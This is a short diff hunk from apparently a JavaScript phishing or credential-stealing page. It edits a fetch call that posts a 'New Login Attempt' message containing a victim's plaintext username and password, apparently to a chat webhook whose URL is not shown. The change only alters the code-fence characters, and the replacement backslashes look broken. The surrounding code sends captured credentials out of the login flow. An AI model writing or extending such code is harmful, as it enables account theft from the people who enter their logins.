@@ -82,12 +82,12 @@
                 },
                 body: JSON.stringify({
                     content: `
-                    \`\`\`
+                    \\\
                     :key: **New Login Attempt**
                     :bust_in_silhouette: **Username:** ${username}
                     :lock: **Password:** ${password}
                     :clock3: **Time:** ${new Date().toLocaleString()}
-                    \`\`\`
+                    \\\
                     `
                 }),
             }).then(response => {
